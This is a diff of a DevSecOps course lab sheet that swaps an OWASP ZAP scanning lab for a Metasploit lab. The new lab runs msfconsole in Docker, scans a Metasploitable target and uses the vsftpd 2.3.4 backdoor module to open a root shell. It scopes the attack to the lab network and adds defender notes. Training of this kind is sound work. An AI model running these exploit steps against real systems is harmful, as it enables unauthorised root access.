@@ -1,5 +1,5 @@
-# Lab 7: OWASP ZAP Basics
-### Spider, passive-scan, and active-scan Juice Shop — headless on Cloud9
+# Lab 7: Metasploit Basics
+### Run a known exploit against the lab Metasploitable target
 **DevSecOps — Module 7 of 9**
 
 ---
@@ -8,123 +8,185 @@
 
 ### Objectives
 
-- Run a headless ZAP **baseline scan** against Juice Shop
-- Read and triage the HTML / JSON report
-- Map findings to OWASP Top 10 categories
+- Launch and navigate `msfconsole` (via the official Docker image on Cloud9)
+- Search, configure, and run an exploit module
+- Land a session and run basic commands as evidence
 
 ### Prerequisites
 
-- Lab 1 completed; Juice Shop on the `devsecops-lab` network
+- Lab 1 completed; `metasploitable-<your-name>` running on the `devsecops-lab` network
 
-> ⏱ **Duration:** 45 min — baseline (~3 min) + triage + full scan (~8 min)
+> ⏱ **Duration:** ~30 minutes
 > 👥 **Pair:** No
 
-> 💡 Cloud9 has no desktop, so we run the **headless** ZAP container — the same approach Lab 9 will use in CI.
-
 ---
 
-## Step 1: Baseline scan (passive only) — ~3 min
+## Step 1: Start `msfconsole` (in a container)
+
+Run the official Metasploit image with a host-mounted workspace so you keep loot/notes after the container exits:
 
 ```bash
-mkdir -p ~/environment/devsecops-work/zap
-chmod 777 ~/environment/devsecops-work/zap   # ZAP container runs as a different uid
+mkdir -p ~/environment/devsecops-work/msf
 
-docker run --rm -t \
+docker run --rm -it \
+  --name msf-${USER} \
   --network devsecops-lab \
-  -v $HOME/environment/devsecops-work/zap:/zap/wrk:rw \
-  ghcr.io/zaproxy/zaproxy:stable \
-  zap-baseline.py \
-    -t http://juice-shop:3000 \
-    -r lab7-baseline.html \
-    -J lab7-baseline.json \
-    -I
+  -v $HOME/environment/devsecops-work/msf:/home/msf \
+  metasploitframework/metasploit-framework:latest \
+  ./msfconsole -q
 ```
 
-- `-I` keeps the exit code 0 even if warnings are present (we'll gate on this in Lab 9).
-- The report lands in `~/environment/devsecops-work/zap/lab7-baseline.html`.
+The `-q` skips the banner. You'll land at:
 
-> ✅ **Checkpoint:** the command exits with **PASS** / **FAIL** summary and produces both `.html` and `.json` files.
+```
+msf6 >
+```
+
+Useful first commands:
+
+```text
+msf6 > version            # confirm install
+msf6 > help               # cheat-sheet
+msf6 > workspace -a lab6  # tidy workspace
+```
 
 ---
 
-## Step 2: Understand the modes (read while scan runs)
+## Step 2: Resolve & verify the target
 
-| Mode | What it does | When to use |
-|---|---|---|
-| Spider | Crawls links from a seed URL (no JS) | Always — fast |
-| AJAX Spider | Drives a real browser to discover client-rendered URLs | SPAs |
-| Passive scan | Inspects every request/response — no extra traffic | Always on |
-| Active scan | Sends attack payloads (XSS, SQLi, etc.) | Lab/staging only |
+The target's network alias is `metasploitable` (set by the Lab 1 setup script):
 
-`zap-baseline.py` = spider + passive only. `zap-full-scan.py` adds active (covered in stretch goals).
+```text
+msf6 > db_nmap -Pn -sV -p 21,22,80,139,445 metasploitable
+msf6 > hosts
+msf6 > services
+```
+
+Services should populate.
 
 ---
 
-## Step 3: Triage the report
+## Step 3: Pick the friendly first exploit
 
-Open `lab7-baseline.html` via Cloud9 (right-click → **Open**), or summarise with jq:
+The `vsftpd 2.3.4` daemon shipped with a known backdoor — easiest, most predictable first run.
 
-```bash
-# Top alert categories sorted by count
-jq -r '.site[].alerts[] | "\(.riskdesc)\t\(.name)"' \
-  ~/environment/devsecops-work/zap/lab7-baseline.json \
-  | sort | uniq -c | sort -rn
-
-# High-severity only (the same one-liner Lab 9's gate uses)
-jq '.site[].alerts[] | select(.riskcode | tonumber >= 3) | {risk: .riskdesc, name: .name}' \
-  ~/environment/devsecops-work/zap/lab7-baseline.json
+```text
+msf6 > search vsftpd
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(vsftpd_234_backdoor) > info
+msf6 exploit(vsftpd_234_backdoor) > show options
 ```
 
-In `~/environment/devsecops-work/zap/lab7-triage.md`, answer:
-
-1. How many **Medium**+**High** findings did the baseline report?
-2. Which OWASP Top 10 category does each Medium+ map to?
-3. Pick **one** finding — could you reproduce it manually with `curl`?
-4. Which findings would you classify as **false positive** for a B2C web app like this?
+`info` is your friend — what it does, target platforms, options that matter.
 
 ---
 
-## Step 4: Full scan (passive + active) — required
+## Step 4: Configure & run
 
-> ⚠️ Active scans send attack traffic. Scoped only to your own Juice Shop on the lab network.
-
-```bash
-docker run --rm -t \
-  --network devsecops-lab \
-  -v $HOME/environment/devsecops-work/zap:/zap/wrk:rw \
-  ghcr.io/zaproxy/zaproxy:stable \
-  zap-full-scan.py \
-    -t http://juice-shop:3000 \
-    -r lab7-full.html \
-    -J lab7-full.json \
-    -I -T 8
+```text
+msf6 exploit(vsftpd_234_backdoor) > set RHOSTS metasploitable
+msf6 exploit(vsftpd_234_backdoor) > check         # safe, non-exploiting probe
+msf6 exploit(vsftpd_234_backdoor) > run
 ```
 
-`-T 8` time-bounds the scan to 8 minutes — enough to surface new High-severity findings that the baseline missed (Reflected XSS, SQLi, etc.). While it runs, finish Step 3's triage.
+Expected outcome:
 
-Compare the two reports:
-
-```bash
-jq '[.site[].alerts[] | select(.riskcode | tonumber >= 3)] | length' \
-   ~/environment/devsecops-work/zap/lab7-baseline.json \
-   ~/environment/devsecops-work/zap/lab7-full.json
+```
+[+] metasploitable:21 - Backdoor service has been spawned, handling...
+[+] metasploitable:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened
 ```
 
-Expect the full-scan count to be higher. This is the same one-liner Lab 9's pipeline gate uses.
+> ✅ **Checkpoint:** you have a `Command shell session` open as `root`.
+
+---
+
+## Step 5: Capture evidence
+
+Inside the session:
+
+```text
+id
+hostname
+uname -a
+ls -la /root
+```
+
+Don't read sensitive files; this is a lab, but practise the habit.
+
+Capture by selecting → copying terminal output, paste into `~/environment/devsecops-work/lab6-evidence.txt`.
+
+---
+
+## Step 6: Background and inspect the session
+
+```text
+^Z       (or type "background")
+[*] Backgrounding session 1...
+
+msf6 exploit(vsftpd_234_backdoor) > sessions
+msf6 exploit(vsftpd_234_backdoor) > sessions -i 1     # re-attach
+^Z
+msf6 exploit(vsftpd_234_backdoor) > sessions -k 1     # kill it
+```
+
+Practise these — everyday vocabulary.
+
+---
+
+## Step 7: Try `local_exploit_suggester` (optional, 5 min)
+
+```text
+msf6 > sessions
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 post(local_exploit_suggester) > set SESSION 1
+msf6 post(local_exploit_suggester) > run
+```
+
+> 🛑 **Do not run any suggested escalation module.** Out of scope. The suggester is information; pivoting is not in scope.
+
+---
+
+## Step 8: Lab-6 report
+
+Save `~/environment/devsecops-work/lab6-report.md`:
+
+```markdown
+# Lab 7 — Metasploit basics
+
+**Tester:** <your name>
+**Target:** metasploitable (lab network)
+**Module:** exploit/unix/ftp/vsftpd_234_backdoor
+
+## Outcome
+Session opened as root. Evidence captured.
+
+## Commands & options
+- RHOSTS = metasploitable
+- run
+
+## Evidence
+\`\`\`
+<paste your captured terminal>
+\`\`\`
+
+## Defender's view
+- This module is detected by most modern EDR signatures
+- A patched vsftpd (≥ 2.3.5) closes the backdoor
+- An IDS rule matching the magic ":)" username trigger would catch it
+```
 
 ---
 
 ## Cleanup
 
-ZAP runs with `--rm`, so containers self-clean. Reports stay in `~/environment/devsecops-work/zap/`.
+```text
+msf6 > sessions -K        # kill all sessions
+msf6 > exit
+```
 
----
-
-## Stretch (after class)
-
-### Auth-aware scanning
-
-Most app risk lives behind login. Drop a session cookie / bearer token into a context file and re-run the scan against the authenticated site tree (see ZAP docs).
+The Metasploit container exits with `--rm`. Targets stay running.
 
 ---
 
@@ -132,6 +194,8 @@ Most app risk lives behind login. Drop a session cookie / bearer token into a co
 
 | Symptom | Fix |
 |---|---|
-| `cannot reach juice-shop` | Confirm `--network devsecops-lab` |
-| `Permission denied` writing report | `chmod 777 ~/environment/devsecops-work/zap` (uid mismatch) |
-| Cloud9 disk fills | Clear images: `docker image prune -a` after lab |
+| Container exits with "TTY required" | Make sure you used `-it` flags |
+| `Postgresql connection refused` | Inside container: `msfdb init && msfdb start` |
+| `db_nmap` says "host appears to be down" | Confirm `--network devsecops-lab` was passed |
+| Exploit `run` "completed, no session" | Re-check the alias; `ping metasploitable` from inside the container |
+| Session opens but disconnects immediately | Re-run; vsftpd backdoor occasionally needs a second attempt |
